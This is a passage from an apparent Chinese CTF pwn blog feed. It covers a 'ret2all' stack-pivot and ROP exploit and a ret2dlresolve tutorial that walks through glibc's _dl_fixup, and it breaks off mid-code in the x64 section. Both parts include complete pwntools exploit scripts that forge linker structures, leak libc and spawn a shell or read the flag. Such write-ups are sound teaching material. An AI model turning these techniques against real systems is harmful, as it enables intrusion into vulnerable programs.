+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><code class="hljs python">payload = flat(<br>    <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0xc0</span>,<span class="hljs-string">b&#x27;./flag\x00\x00&#x27;</span>,<br>    pop_rax_ret,<span class="hljs-number">3</span>,<br>    pop_rdi_ret,<span class="hljs-number">0</span>,syscall,<br>    pop_rax_ret,<span class="hljs-number">2</span>,<br>    pop_rdi_ret,RBP+<span class="hljs-number">0xe8</span>,<br>    pop_rsi_ret,<span class="hljs-number">0</span>,syscall,<br>    pop_rax_ret,<span class="hljs-number">0</span>,<br>    pop_rdi_ret,<span class="hljs-number">0</span>,<br>    pop_rsi_ret,RBP,syscall,<br>    pop_rax_ret,<span class="hljs-number">1</span>,<br>    pop_rdi_ret,<span class="hljs-number">2</span>,syscall<br>)<br></code></pre></td></tr></table></figure></div>
+
+<p>这里read的返回地址为RBP+0xf0,后面在跟上orw的rop</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://res.cloudinary.com/drdpahj9c/image/upload/v1762150356/2025/11/a9707fbe7241562f1d6079d94a02f640.png"
+                     
+                ></p>
+<p>exp</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">from</span> pwncli <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#cli_script() </span><br><br>io = process(<span class="hljs-string">&#x27;./pwn_patched&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./pwn_patched&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><span class="hljs-comment">#p =remote(&#x27;node4.anna.nssctf.cn&#x27;,28537)</span><br><span class="hljs-comment">#context.terminal = [&#x27;wt.exe&#x27;, &#x27;wsl&#x27;, &#x27;bash&#x27;, &#x27;-c&#x27;]</span><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>]<br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,arch = elf.arch,os = elf.os)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>(<span class="hljs-params">i</span>):<br>    gdb.attach(i)<br>    pause()<br><br><span class="hljs-comment"># dbg(io)</span><br>io.recvuntil(<span class="hljs-string">&quot;0x&quot;</span>)<br>RBP = <span class="hljs-built_in">int</span>(io.recvline(),<span class="hljs-number">16</span>)<br>success(<span class="hljs-string">&quot;RBP:&quot;</span>+<span class="hljs-built_in">hex</span>(RBP))<br><br>io.recvuntil(<span class="hljs-string">&quot;0x&quot;</span>)<br>RET = <span class="hljs-built_in">int</span>(io.recvline(),<span class="hljs-number">16</span>)<br>success(<span class="hljs-string">&quot;RET:&quot;</span>+<span class="hljs-built_in">hex</span>(RET))   <br><br>elf_base = RET - <span class="hljs-number">0x1871</span><br>success(<span class="hljs-string">&quot;elf_base:&quot;</span>+<span class="hljs-built_in">hex</span>(elf_base))<br><br>read_addr = elf_base + <span class="hljs-number">0x182F</span><br>read_addr2 = elf_base + <span class="hljs-number">0x1840</span><br>read_addr3 = elf_base + <span class="hljs-number">0x183B</span><br>add_rbp_3d_ebx = elf_base + <span class="hljs-number">0x1252</span><br>pop_rbp_ret = add_rbp_3d_ebx +<span class="hljs-number">1</span><br>ret = pop_rbp_ret + <span class="hljs-number">1</span><br>leave_ret = elf_base + <span class="hljs-number">0x1852</span><br><br>payload1 = flat(<br>    <span class="hljs-string">b&#x27;I love you I feel lonely&#x27;</span>*<span class="hljs-number">4</span>,<br>    RBP,<br>    RET,<br>    RBP + <span class="hljs-number">0x10</span>,<br>    read_addr,<br>    RBP - <span class="hljs-number">0x10</span><br>)<br><br><span class="hljs-comment"># dbg(io)</span><br>io.send(payload1)<br><br>payload2 = flat(<br>    p64(<span class="hljs-number">0</span>)*<span class="hljs-number">7</span>,<br>    RBP+<span class="hljs-number">0xf0</span>,<br>    read_addr,<br>    leave_ret,<br>    RBP+<span class="hljs-number">0x100</span>,<br>    leave_ret,<br>    RBP-<span class="hljs-number">0x18</span>,<br>    leave_ret,<br>    <span class="hljs-number">0</span>,<br>    p8(<span class="hljs-number">0xec</span>)<br>)<br><span class="hljs-comment"># dbg(io)</span><br>io.send(payload2)<br>payload3 = flat(<br>    <span class="hljs-string">b&#x27;I love you I feel lonely&#x27;</span>*<span class="hljs-number">4</span>,<br>    RBP,<br>    RET,<br>    RBP+<span class="hljs-number">0xf0</span>,<br>    read_addr<br>)<br><span class="hljs-comment"># dbg(io)</span><br>io.send(payload3)<br><br>payload4 = flat(<br>    <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">8</span>,<br>    p64(<span class="hljs-number">0</span>),RBP+<span class="hljs-number">0x30</span>,<br>    RBP+<span class="hljs-number">0x65</span>,<span class="hljs-number">0x6edca</span>,<br>    <span class="hljs-number">0x200</span>,<span class="hljs-number">0</span>,<br>    <span class="hljs-number">0</span>,RBP+<span class="hljs-number">0x40</span>,<br>    read_addr2,<span class="hljs-number">0</span>,<br>    <span class="hljs-number">0x33</span>,RBP+<span class="hljs-number">0x150</span>+<span class="hljs-number">1</span>,<br>    read_addr,RBP+<span class="hljs-number">0x20</span>,<br>    leave_ret<br>)<br><span class="hljs-comment"># dbg(io)</span><br>io.send(payload4)<br><br>payload5 = flat(<br>    <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">7</span>,<br>    pop_rbp_ret<br>)<br><br><span class="hljs-comment"># dbg(io)</span><br>io.send(payload5)<br><br>payload6 = flat(<br>    leave_ret,add_rbp_3d_ebx,<br>    pop_rbp_ret,RBP+<span class="hljs-number">0xa8</span>+<span class="hljs-number">1</span>,<br>    read_addr,RBP+<span class="hljs-number">0x20</span>,<br>    leave_ret,RBP+<span class="hljs-number">0xd0</span>,<br>    read_addr,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>,<br>    <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<br>    RBP+<span class="hljs-number">0x68</span>,<span class="hljs-number">0</span>,<br>    <span class="hljs-number">0</span>,<span class="hljs-number">33</span>,<br>    <span class="hljs-number">0</span>,RBP+<span class="hljs-number">0x28</span>,<br>    ret,<span class="hljs-number">0</span>,<br>    <span class="hljs-number">0x33</span><br>)<br><span class="hljs-comment"># dbg(io)</span><br>io.send(payload6)<br>payload7 = flat(<br>    <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">7</span>,<br>    pop_rbp_ret<br>)<br><span class="hljs-comment"># dbg(io)</span><br>io.send(payload7)<br><br>payload8 = flat(<br>    pop_rbp_ret,RBP+<span class="hljs-number">0xd8</span>+<span class="hljs-number">1</span>,<br>    read_addr,RBP+<span class="hljs-number">0x20</span>,<br>    leave_ret,<span class="hljs-number">2</span>,<br>    RBP+<span class="hljs-number">0x28</span>,RBP+<span class="hljs-number">0xe8</span>,<br>    <span class="hljs-number">0</span>,<span class="hljs-number">0x200</span>,<br>    <span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<br>    RBP+<span class="hljs-number">0x28</span>,ret,<br>    <span class="hljs-number">0</span>,<span class="hljs-number">0x33</span>,<br>    read_addr3<br>)<br><span class="hljs-comment"># dbg(io)</span><br>io.send(payload8)<br><br>payload9 = flat(<br>    <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">7</span>,<br>    pop_rbp_ret<br>)<br>io.recv()<br><span class="hljs-comment"># dbg(io)</span><br>io.send(payload9)<br><br>syscall = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libc.address = syscall - <span class="hljs-number">0x98fb6</span><br>success(<span class="hljs-string">&quot;libc_address:&quot;</span>+<span class="hljs-built_in">hex</span>(libc.address)) <br><br>pop_rax_ret = libc.address + <span class="hljs-number">0xdd237</span><br>pop_rdi_ret = libc.address + <span class="hljs-number">0x10f75b</span><br>pop_rsi_ret = libc.address + <span class="hljs-number">0x110a4d</span><br>pop_rbx_ret = libc.address + <span class="hljs-number">0x586e4</span><br><br>payload10 = flat(<br>    <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0xc0</span>,<span class="hljs-string">b&#x27;./flag\x00\x00&#x27;</span>,<br>    <span class="hljs-comment">#close(0)</span><br>    pop_rax_ret,<span class="hljs-number">3</span>,<br>    pop_rdi_ret,<span class="hljs-number">0</span>,syscall,<br>    <span class="hljs-comment">#open(&#x27;./flag&#x27;,0) </span><br>    pop_rax_ret,<span class="hljs-number">2</span>,<br>    pop_rdi_ret,RBP+<span class="hljs-number">0xe8</span>,<br>    pop_rsi_ret,<span class="hljs-number">0</span>,syscall,<br>    <span class="hljs-comment">#read(0,RBP,0x200)</span><br>    pop_rax_ret,<span class="hljs-number">0</span>,<br>    pop_rdi_ret,<span class="hljs-number">0</span>,<br>    pop_rsi_ret,RBP,syscall,<br>    <span class="hljs-comment">#write(2,RBP,0x200)</span><br>    pop_rax_ret,<span class="hljs-number">1</span>,<br>    pop_rdi_ret,<span class="hljs-number">2</span>,syscall<br>)<br><br>io.send(payload10)<br>io.interactive()<br></code></pre></td></tr></table></figure></div>
+
+<p>参考：<a class="link"   href="https://lil-house.feishu.cn/wiki/JqIEw4fTPiHcRnkSazacGBTNng6" >‌​‌‬​​﻿﻿‬​﻿‌‌​​﻿​‬⁠​​‍​‍​‬​​​​‬​​​​​​​​​‌​​‬​‍‬​‬⁠ret2all - 飞书云文档<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br>        <a class="link"   href="https://blog.csdn.net/j284886202/article/details/151363747" >LilCTF pwn ret2all-CSDN博客<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+]]></content>
+      <categories>
+        <category>stack</category>
+      </categories>
+      <tags>
+        <tag>ret2all</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ret2dl</title>
+    <url>/2025/05/12/ret2dl/</url>
+    <content><![CDATA[<p>延迟绑定运作流程</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://res.cloudinary.com/drdpahj9c/image/upload/v1754829222/2025/08/02631ce534068f28047ea2c84b4d3cf6.png"
+                     
+                ></p>
+<h3 id="dl-runtime-resolve运作流程"><a href="#dl-runtime-resolve运作流程" class="headerlink" title="dl_runtime_resolve运作流程"></a>dl_runtime_resolve运作流程</h3><p>理解_dl_runtime_resolve的流程需要了解几个段</p>
+<h4 id="1、dynamic段"><a href="#1、dynamic段" class="headerlink" title="1、dynamic段"></a>1、dynamic段</h4><p>.dynamic段中保存了动态链接器需要的信息，Dynamic Symbol Table（动态链接符号表）、Dynamic String Table（动态链接字符串表）、重定位表等的位置<br>动调看一下具体情况</p>
+<p>ELF32_Dyn的结构如下</p>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>  </span><br><span class="hljs-class">&#123;</span>  <br>  Elf32_Sword  d_tag;       <span class="hljs-comment">/* Dynamic entry type */</span>  <br>  <span class="hljs-class"><span class="hljs-keyword">union</span>  </span><br><span class="hljs-class">    &#123;</span>  <br>      Elf32_Word d_val;          <span class="hljs-comment">/* Integer value */</span>  <br>      Elf32_Addr d_ptr;          <span class="hljs-comment">/* Address value */</span>  <br>    &#125; d_un;  <br>&#125; Elf32_Dyn;<br></code></pre></td></tr></table></figure></div>
+
+<p>整个结构体为8字节，</p>
+<h4 id="2、Dynamic-Symbol-Table（动态链接符号表）"><a href="#2、Dynamic-Symbol-Table（动态链接符号表）" class="headerlink" title="2、Dynamic Symbol Table（动态链接符号表）"></a>2、Dynamic Symbol Table（动态链接符号表）</h4><p>通常被称为”.dynsym”,<code>readelf -s file</code>可查看，保存了与动态链接相关的符号，”.symtab”中保存了所有符号</p>
+<h4 id="3、Dynamic-String-Table（动态链接字符串表）"><a href="#3、Dynamic-String-Table（动态链接字符串表）" class="headerlink" title="3、Dynamic String Table（动态链接字符串表）"></a>3、Dynamic String Table（动态链接字符串表）</h4><p>通常被称为”.dymstr”,再ida中可以找到，记录了符号的名称。因为.dynsym记录了固定长度的内容，不能描述二进制文件的任意字符串，所以需要该表来存储函数的名称。</p>
+<h4 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h4><p>（结合动调来看一下）<br>dl_runtime_resolve(link_map_obj, reloc_index)</p>
+<p> 它调用了dl_fixup函数 dl_fixup函数又调用了_dl_lookup_symbol_x函数</p>
+<p>dl_fixup部分源码如下</p>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><code class="hljs c">_dl_fixup(<span class="hljs-keyword">struct</span> link_map *l,ElfW(Word) reloc_arg)<br>&#123;<br>	<span class="hljs-comment">// 首先通过参数reloc_arg计算重定位的入口，这里的JMPREL即.rel.plt，reloc_offest即reloc_arg</span><br>	<span class="hljs-type">const</span> PLTREL *<span class="hljs-type">const</span> reloc = (<span class="hljs-type">const</span> <span class="hljs-type">void</span> *)(D_PTR(l, l_info[DT_JMPREL]) + reloc_offset);<br>	<span class="hljs-comment">// 然后通过reloc-&gt;r_info找到.dynsym中对应的条目</span><br>	<span class="hljs-type">const</span> <span class="hljs-title function_">ElfW</span><span class="hljs-params">(Sym)</span> *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];<br>	<span class="hljs-comment">// 这里还会检查reloc-&gt;r_info的最低位是不是R_386_JMUP_SLOT=7</span><br>	assert(ELF(R_TYPE)(reloc-&gt;info) == ELF_MACHINE_JMP_SLOT);<br>	<span class="hljs-comment">// 接着通过strtab+sym-&gt;st_name找到符号表字符串，result为libc基地址</span><br>	result = _dl_lookup_symbol_x (strtab + sym -&gt;st_name, l, &amp;sym, l-&gt;l_scope, version, ELF_RTYPE_CLASS_PLT, flags, <span class="hljs-literal">NULL</span>);<br>	<span class="hljs-comment">// value为libc基址加上要解析函数的偏移地址，也即实际地址</span><br>	value = DL_FIXUP_MAKE_VALUE (result, sym ? (LOOKUP_VALUE_ADDRESS(result) + sym-&gt;st_value) : <span class="hljs-number">0</span>);<br>	<span class="hljs-comment">// 最后把value写入相应的GOT表条目中</span><br>	<span class="hljs-keyword">return</span> elf_machine_fixup_plt (l, result, reloc, rel_addr, value);	<br>&#125;<br><br></code></pre></td></tr></table></figure></div>
+
+<p>首先通过link_map去找到.dynamic的地址，再分别取出.dynstm .dynstr .rel.plt</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://res.cloudinary.com/drdpahj9c/image/upload/v1754829224/2025/08/e48c0a10b92a26daf7ac1ad7a45791c7.png"
+                     
+                ></p>
+<p>其中两个入操作为_dl_runtime_resolve的参数，分别是reloc_index,和link_map的地址</p>
+<p>link_map源码如下</p>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">link_map</span></span><br><span class="hljs-class">  &#123;</span><br>    <span class="hljs-comment">/* These first few members are part of the protocol with the debugger.</span><br><span class="hljs-comment">       This is the same format used in SVR4.  */</span><br><br>    ElfW(Addr) l_addr;    <span class="hljs-comment">/* Base address shared object is loaded at.  */</span><br>    <span class="hljs-type">char</span> *l_name;     <span class="hljs-comment">/* Absolute file name object was found in.  */</span><br>    ElfW(Dyn) *l_ld;      <span class="hljs-comment">/* Dynamic section of the shared object.  */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">link_map</span> *<span class="hljs-title">l_next</span>, *<span class="hljs-title">l_prev</span>;</span> <span class="hljs-comment">/* Chain of loaded objects.  */</span><br>&#125;;<br><br></code></pre></td></tr></table></figure></div>
+
+<p>第三个参数即为.dynamic的地址<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://res.cloudinary.com/drdpahj9c/image/upload/v1754829225/2025/08/e328258e21b57ba92b2dbcd6e9b55734.png"
+                     
+                ></p>
+<p><code>readelf -d file</code>查看一下.dynamic内容</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://res.cloudinary.com/drdpahj9c/image/upload/v1754829228/2025/08/a619508160ffafc300ae1ce5485e9b55.png"
+                     
+                ></p>
+<p>.dynstm .dynstr和.rel.plt的偏移分别为9，10，16.结合ELF32_Dyn为8字节，实际的值在后面4节，因此可以得到他们的偏移分别是<code>9*8-4</code>，<code>10*8-4</code>可以对应去取出相应的内容。</p>
+<p>rel.plt加上reloc_index就定位了ELF32_Rel指针，即0x804833c + 0</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://res.cloudinary.com/drdpahj9c/image/upload/v1754829229/2025/08/07d5bb5a0752db34589e8bade9e437cc.png"
+                     
+                ></p>
+<p>ELF32_Rel源码如下</p>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>  Elf32_Addr   r_offset;     <span class="hljs-comment">/* Address */</span><br>  Elf32_Word   r_info;          <span class="hljs-comment">/* Relocation type and symbol index */</span><br>&#125; Elf32_Rel;<br><br></code></pre></td></tr></table></figure></div>
+
+<p>根据ida中图得知，r_offset即 0x804a00c，是got.plt的地址，最后的解析地址也将会放入这里，r_inf0 &#x3D; 0x107</p>
+<p>而将r_info&gt;&gt;8作为dynsym的下标，即0x107&gt;&gt;8&#x3D;1  即右移8位</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://res.cloudinary.com/drdpahj9c/image/upload/v1754829232/2025/08/55898692e61b608d013e0324c2062750.png"
+                     
+                ></p>
+<p>Elf32_Sym的源码如下</p>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>  </span><br><span class="hljs-class">&#123;</span>  <br>  Elf32_Word   st_name;      <span class="hljs-comment">/* Symbol name (string tbl index) */</span>  <br>  Elf32_Addr   st_value;     <span class="hljs-comment">/* Symbol value */</span>  <br>  Elf32_Word   st_size;      <span class="hljs-comment">/* Symbol size */</span>  <br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>    st_info;      <span class="hljs-comment">/* Symbol type and binding */</span>  <br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>    st_other;     <span class="hljs-comment">/* Symbol visibility */</span>  <br>  Elf32_Section    st_shndx;     <span class="hljs-comment">/* Section index */</span>  <br>&#125; Elf32_Sym;<br></code></pre></td></tr></table></figure></div>
+
+<p>第一个st_name就是.dynstr距离函数名的偏移。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://res.cloudinary.com/drdpahj9c/image/upload/v1754829234/2025/08/baebc85cf654dc988aa3a35465ee2be4.png"
+                     
+                ></p>
+<p>偏移即为20</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://res.cloudinary.com/drdpahj9c/image/upload/v1754829236/2025/08/30f6909d006cd4b54b681b1691d5fe65.png"
+                     
+                ></p>
+<p>.dynstr首地址加上0x20就是read的函数名</p>
+<p>最后</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://res.cloudinary.com/drdpahj9c/image/upload/v1754829239/2025/08/73abd993c00ca0b0dc43cb727708b8ff.png"
+                     
+                ></p>
+<p>调用dl_lookup_symbol_x,在动态链接库中搜索。</p>
+<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>上述过程总结一下</p>
+<p>我们的目的是找到函数名称字符串的地址，交给dl_lookup_symbol_x去libc中寻找。</p>
+<p>流程便是获得.dynstr中函数名称字符串的流程</p>
+<p>首先通过link_map去找到.dynamic段的地址，因为可以以此得到.dynsym .dynstr .rel.plt的地址</p>
+<p>.rel.plt地址 加上 dl_runtime_resolve的第二个参数reloc_index可以得到read的Elf32_Rel</p>
+<p>接下来通过由ELF32_Rel第二个成员r_info&gt;&gt;8，即可得到.dynsym中的偏移得到read Elf32_Sym</p>
+<p>Elf32_Sym中的第一个参数st_name存放着函数名称字符串距离.dynstr首地址的偏移，如此便得到了函数名称字符串</p>
+<h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>清楚了上面流程，发现最后dl_lookup_symbol_x函数回去搜索字符串，但是不会检查是否是此时延迟绑定的函数。同时没有检查重定位表的边界，dl_runtime_resolve的第二个参数reloc_index可以很大，超过.rel.plt范围。</p>
+<p>因此我们可以伪造第二个参数,使其偏移到我们的可控内存，再按照上面流程，伪造一系列结构，最后让距离</p>
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><h4 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h4><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">vuln</span><span class="hljs-params">()</span><br>&#123;<br>  _BYTE buf[<span class="hljs-number">40</span>]; <span class="hljs-comment">// [esp+0h] [ebp-28h] BYREF</span><br><br>  <span class="hljs-keyword">return</span> read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x100u</span>);<br>&#125;<br></code></pre></td></tr></table></figure></div>
+
+<p>只有一个read，没有打印函数</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><br>  <br><br>p = process(<span class="hljs-string">&#x27;./ret2dl&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./ret2dl&#x27;</span>)<br><span class="hljs-comment">#libc = ELF(&quot;./libc-2.27.so&quot;)</span><br><br>  <br><br><span class="hljs-comment">#p =remote(&#x27;node4.anna.nssctf.cn&#x27;,28537)</span><br>context.terminal = [<span class="hljs-string">&#x27;wt.exe&#x27;</span>, <span class="hljs-string">&#x27;wsl&#x27;</span>, <span class="hljs-string">&#x27;bash&#x27;</span>, <span class="hljs-string">&#x27;-c&#x27;</span>]<br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,arch = elf.arch,os = elf.os)<br><br>  <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(p)<br>    pause()<br><br>  <br><br>plt0 = elf.get_section_by_name(<span class="hljs-string">&#x27;.plt&#x27;</span>).header.sh_addr<br>rel_plt = elf.get_section_by_name(<span class="hljs-string">&#x27;.rel.plt&#x27;</span>).header.sh_addr<br>dynsym = elf.get_section_by_name(<span class="hljs-string">&#x27;.dynsym&#x27;</span>).header.sh_addr<br>dynstr = elf.get_section_by_name(<span class="hljs-string">&#x27;.dynstr&#x27;</span>).header.sh_addr<br><br>  <br>offset = <span class="hljs-number">0x28</span> + <span class="hljs-number">4</span><br>read_plt = elf.plt[<span class="hljs-string">&#x27;read&#x27;</span>]<br>pop_ebx_esi_edi_ebp_ret = <span class="hljs-number">0x080485d8</span><br>leave_ret = <span class="hljs-number">0x0804852b</span><br><span class="hljs-comment">#bss = 0x804a040</span><br>base_addr = <span class="hljs-number">0x0804a800</span><br><br>  <br>fake_sym_addr=base_addr+<span class="hljs-number">32</span><br>align=<span class="hljs-number">0x10</span>-((fake_sym_addr-dynsym)&amp;<span class="hljs-number">0xf</span>) <span class="hljs-comment">#16字节对齐</span><br>fake_sym_addr+=align<br>st_name=fake_sym_addr+<span class="hljs-number">0x10</span>-dynstr<br>st_info=<span class="hljs-number">12</span><br>fake_sym=p32(st_name)+p32(<span class="hljs-number">0</span>)+p32(<span class="hljs-number">0</span>)+p32(st_info) <span class="hljs-comment">#伪造Elf32_Sym</span><br><br>  <br>r_offset = elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br>r_sym=(fake_sym_addr-dynsym)/<span class="hljs-number">0x10</span><br>r_type=<span class="hljs-number">0x7</span><br>r_info=(<span class="hljs-built_in">int</span>(r_sym)&lt;&lt;<span class="hljs-number">8</span>)+(r_type&amp;<span class="hljs-number">0xf</span>)<br>reloc_index=base_addr-rel_plt+<span class="hljs-number">24</span><br>fake_rel_plt=p32(r_offset)+p32(r_info)<br><br>  <br><br><span class="hljs-comment">#debug()</span><br>payload=offset*<span class="hljs-string">b&#x27;a&#x27;</span><br>payload+=p32(read_plt)<br>payload+=p32(pop_ebx_esi_edi_ebp_ret)<br>payload+=p32(<span class="hljs-number">0</span>)<br>payload+=p32(base_addr)<br>payload+=p32(<span class="hljs-number">100</span>)<br>payload+=p32(base_addr-<span class="hljs-number">4</span>)<br>payload+=p32(leave_ret)<br>p.sendline(payload)<br><br>  <br>debug()<br>payload1=p32(plt0)<br>payload1+=p32(reloc_index)<br>payload1+= p32(<span class="hljs-number">0</span>)<br>payload1+=p32(base_addr+<span class="hljs-number">80</span>)<br>payload1+=p32(<span class="hljs-number">0</span>)<br>payload1+=p32(<span class="hljs-number">0</span>)<br>payload1+=fake_rel_plt<br>payload1+=align*<span class="hljs-string">b&#x27;a&#x27;</span><br>payload1+=fake_sym<br>payload1+=<span class="hljs-string">b&#x27;system\x00&#x27;</span><br>payload1+=(<span class="hljs-number">80</span>-<span class="hljs-built_in">len</span>(payload))*<span class="hljs-string">b&#x27;a&#x27;</span><br>payload1+=<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span><br><br>  <br>p.send(payload1)<br>p.interactive()<br></code></pre></td></tr></table></figure></div>
+
+
+
+<h4 id="x64"><a href="#x64" class="headerlink" title="x64"></a>x64</h4><p>x64如果按照x86一样伪造间接控制重定向的各表项，会出现问题。<br>原因是在_dl_fixup函数执行过程中，访问到了一段未映射的地址</p>
+<p>查看dl_fixup的完整源码分析<a href="#x64">ret2_dl_runtime_resolve</a></p>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><code class="hljs c">_dl_fixup (<span class="hljs-keyword">struct</span> link_map *l, ElfW(Word) reloc_arg) <span class="hljs-comment">// 第一个参数link_map，也就是got[1]</span><br>&#123;<br>    <span class="hljs-comment">// 获取link_map中存放DT_SYMTAB的地址</span><br>  <span class="hljs-type">const</span> <span class="hljs-title function_">ElfW</span><span class="hljs-params">(Sym)</span> *<span class="hljs-type">const</span> symtab = (<span class="hljs-type">const</span> <span class="hljs-type">void</span> *) D_PTR (l, l_info[DT_SYMTAB]);<br>    <span class="hljs-comment">// 获取link_map中存放DT_STRTAB的地址</span><br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *strtab = (<span class="hljs-type">const</span> <span class="hljs-type">void</span> *) D_PTR (l, l_info[DT_STRTAB]);<br>	<span class="hljs-comment">// reloc_offset就是reloc_arg,获取重定位表项中对应函数的结构体</span><br>  <span class="hljs-type">const</span> PLTREL *<span class="hljs-type">const</span> reloc = (<span class="hljs-type">const</span> <span class="hljs-type">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);<br>    <span class="hljs-comment">// 根据重定位结构体的r_info得到symtab表中对应的结构体</span><br>  <span class="hljs-type">const</span> <span class="hljs-title function_">ElfW</span><span class="hljs-params">(Sym)</span> *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];<br>    <br>  <span class="hljs-type">void</span> *<span class="hljs-type">const</span> rel_addr = (<span class="hljs-type">void</span> *)(l-&gt;l_addr + reloc-&gt;r_offset);<br>  <span class="hljs-type">lookup_t</span> result;<br>  DL_FIXUP_VALUE_TYPE value;<br><br>  <span class="hljs-comment">/* Sanity check that we&#x27;re really looking at a PLT relocation.  */</span><br>  assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT); <span class="hljs-comment">// 检查r_info的最低位是不是7</span><br><br>   <span class="hljs-comment">/* Look up the target symbol.  If the normal lookup rules are not</span><br><span class="hljs-comment">      used don&#x27;t look in the global scope.  */</span><br>  <span class="hljs-keyword">if</span> (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), <span class="hljs-number">0</span>) == <span class="hljs-number">0</span>) <span class="hljs-comment">// 这里是一层检测，检查sym结构体中的st_other是否为0，正常情况下为0，执行下面代码</span><br>    &#123;<br>      <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">r_found_version</span> *<span class="hljs-title">version</span> =</span> <span class="hljs-literal">NULL</span>;<br>	<span class="hljs-comment">// 这里也是一层检测，检查link_map中的DT_VERSYM是否为NULL，正常情况下不为NULL，执行下面代码</span><br>      <span class="hljs-keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="hljs-literal">NULL</span>)<br>	&#123;<br>      <span class="hljs-comment">// 到了这里就是64位下报错的位置，在计算版本号时，vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; 